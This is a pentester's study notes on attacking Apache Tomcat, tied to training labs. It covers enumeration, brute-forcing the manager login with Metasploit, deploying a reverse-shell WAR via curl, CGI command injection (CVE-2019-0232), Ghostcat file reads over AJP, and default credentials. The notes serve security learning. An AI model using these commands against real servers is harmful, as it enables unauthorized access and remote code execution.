# Apache Tomcat

<div class="row row-cols-lg-2"><div>

[Apache Tomcat](https://tomcat.apache.org/) is an open-source web server. It provides a Java HTTP web server environment in which Java code can run.

* [GitHub](https://github.com/apache/tomcat) <small>(7.7k ⭐)</small>
* [Documentation](https://tomcat.apache.org/tomcat-11.0-doc/index.html) <small>(⛪)</small>

The version 11 is still in development. The previous major versions are version 10 <small>(2021)</small>, version 9 <small>(2018)</small>, and version 8 <small>(2016)</small>.
</div><div>

A java web application can use either or both servlets and JSPs. A combination of both is the most common architecture.

* **Servlets** ☕: the whole logic is in Java
* **JSP** 🐲: html-like template files in which we can add Java logic to handle input and create interactive pages.

The admin panel to upload applications if usually at `/manager/html`. To upload an application, you need to package it as a WAR archive. Each app is deployed at a URI, and `index.jsp` is loaded by default <small>(else error)</small>.
</div></div>

<hr class="sep-both">

## Pentester Notes ☠️

[![linuxprivilegeescalation](../../../../../cybersecurity/_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
[![attacking_common_applications](../../../../../cybersecurity/_badges/htb/attacking_common_applications.svg)](https://academy.hackthebox.com/course/preview/attacking-common-applications)
[![jerry](../../../../../cybersecurity/_badges/htb-p/jerry.svg)](https://app.hackthebox.com/machines/Jerry)
[![cozyhosting](../../../../../cybersecurity/_badges/htb-p/cozyhosting.svg)](https://app.hackthebox.com/machines/CozyHosting)

<div class="row row-cols-lg-2"><div>

* You can try [tomcatWarDeployer](https://github.com/mgeeky/tomcatWarDeployer) <small>(0.4k ⭐, 2022 🪦)</small>, but it's memory hungry, buggy, unstable, and you need to patch the code first 🪦. It's a multipurpose tool <small>(from enumeration to exploitation, albeit basic)</small>.

#### Enumeration

![bizness](../../../../../cybersecurity/_badges/htb-p/bizness.svg)

* You can use [nmap](/cybersecurity/red-team/tools/scanners/ports/nmap.md). It often runs on port 8080.

```shell!
$ sudo nmap IP -sCV -v
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```

* We can often easily recognize a website using Apache Tomcat from the presence of the `JSESSIONID` cookie while we may also trigger an error to see the error message page layout. Additionally, the URI `/docs` may be available and expose Tomcat version.

* Maybe [Sprint Boot Actuators](/programming-languages/high-level/oo/java/others/boot/actuators.md) are being used.

* We can disclose tomcat version by sending a query using an invalid method that should raise a 405 (ex: `curl -X PUT URL`)

#### Foothold

* If you close the login prompt, you may see default credentials

* We can try to brute force the manager account using [metasploit](/cybersecurity/red-team/tools/frameworks/metasploit/index.md).

```shell!
$ msfconsole -q
msf6> use auxiliary/scanner/http/tomcat_mgr_login
msf6> set RHOSTS <target>
msf6> set STOP_ON_SUCCESS true
msf6> set ANONYMOUS_LOGIN true
msf6> set BLANK_PASSWORDS true
msf6> run
```
</div><div>

#### Exploitation

* If you have access to the manager, you can try to upload a reverse shell. Refer to [reverse shell#tomcat](/cybersecurity/red-team/s3.exploitation/shell/reverse_shell.md#tomcat-reverse-shell) for more information.

* You can also try to use metasploit to [upload a reverse shell](/cybersecurity/red-team/s3.exploitation/shell/reverse_shell.md#tomcat-reverse-shell)

* You can use cURL to upload a WAR too:

```ps
$ curl --upload-file revshell.war -u 'username:password' "URL/manager/text/deploy?path=/shell"
```

#### Well-known CVEs

[![attacking_common_applications](../../../../../cybersecurity/_badges/htb/attacking_common_applications.svg)](https://academy.hackthebox.com/course/preview/attacking-common-applications)
[![adventofcyber2](../../../../../cybersecurity/_badges/thm/adventofcyber2/day12.svg)](https://tryhackme.com/room/adventofcyber2)

* [CVE-2019-0232](https://nvd.nist.gov/vuln/detail/CVE-2019-0232): on Windows host, if there is a cgi script and `enableCmdLineArguments` was enabled <small>(default to disabled)</small>, it can be exploited to arbitrarily run commands.

You must find the [CGI](/cybersecurity/red-team/s2.discovery/techniques/websites/forced_browsing.md#cgi-scripts) directory which is often `/cgi` or `/cgi-bin/` and find at least one script. Use `URL/xxx/yyy.bat?&dir` to execute `dir`.

* Use `+` instead of spaces. Use <code>\\</code> in paths. 
* Don't forgot to URL encode the payload.
* Use redirections when needed <small>(e.g. `dir+>+output` to create 'output')</small>.
* Display environment variables using `&set`. If `PATH` is not set, you have to use the full path <small>(e.g. `c:\windows\system32\whoami.exe`)</small>.

You can use the metasploit module `tomcat_cgi_cmdlineargs`.
</div></div>

<hr class="sep-both">

## Apache AJP

[![server_side_attacks](../../../../../cybersecurity/_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)

<div class="row row-cols-lg-2"><div>

Apache AJP is a wire protocol. It allows a web server such as Apache to talk to tomcat. A few notes:

* 🐲 It runs on port 8009/TCP <small>(by default)</small>
* 🪦 It's not often exposed
* 📚 We need to configure a webserver to communicate with it

While uncommon, if a tomcat website is behind a firewall, but the AJP port is exposed, we can use AJP to access the 'hidden' tomcat website.

#### AJP Exploitation

[![server_side_attacks](../../../../../cybersecurity/_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![ajp](../../../../../cybersecurity/_badges/hacktricks/network_services_pentesting/ajp.svg)](https://book.hacktricks.xyz/network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp)

* We can use [nginx](/operating-systems/cloud/webservers/nginx/index.md) with `nginx_ajp_module`
* We can use [Apache](/operating-systems/cloud/webservers/apache/index.md) with `proxy_ajp`
* We can use [AJPy](https://github.com/hypn0s/AJPy) <small>(0.5k ⭐)</small>

```
$ git clone https://github.com/hypn0s/AJPy.git && cd AJPy
$ python tomcat.py --port 8009 "version" IP
<print tomcat manager version>
```
</div><div>

#### AJP Well-known CVEs

[![attacking_common_applications](../../../../../cybersecurity/_badges/htb/attacking_common_applications.svg)](https://academy.hackthebox.com/course/preview/attacking-common-applications)
[![tomghost](../../../../../cybersecurity/_badges/thm-p/tomghost.svg)](https://tryhackme.com/room/tomghost)

* [CVE-2020-1938](https://nvd.nist.gov/vuln/detail/CVE-2020-1938): unauthenticated LFI that can be used to read files in the webroot, such as `WEB-INF/web.xml` or `WEB-INF/cgi/xxx.bat`. Apache JServ which usually runs on port `8009` must be exposed.

It can be exploited using metasploit:

```shell!
msf6> use auxiliary/admin/http/tomcat_ghostcat
```

The file `web.xml` contains the manager credentials if they were defined.
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* [apache-tomcat-pentesting](https://exploit-notes.hdks.org/exploit/web/apache-tomcat-pentesting/)
* Jetty - it seems like an alternative
* `/manager/status` server status (admin:admin)
* not the same credentials on each page
* when uploading, on the same page, there are information about the server architecture, which we can use to fine tune the payload
* `jar -ft revshell.jar`/`jd-gui`: to see metasploit endpoint name
* when pressing ESC on login, it may print the message with the default credentials
</div><div>

* `/etc/tomcat9/<config files>`
* `web.xml`, `tomcat-users.xml`
* `SESSIONS.ser`

While not really related:

![bizness](../../../../../cybersecurity/_badges/htb-p/bizness.svg)

* `/control/xmlrpc`, `/webtools/control/main`, `/control/checkLogin`
* Try default credentials (`admin:ofbiz`)
* [CVE-2023-50164](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass) lead to RCE
</div></div>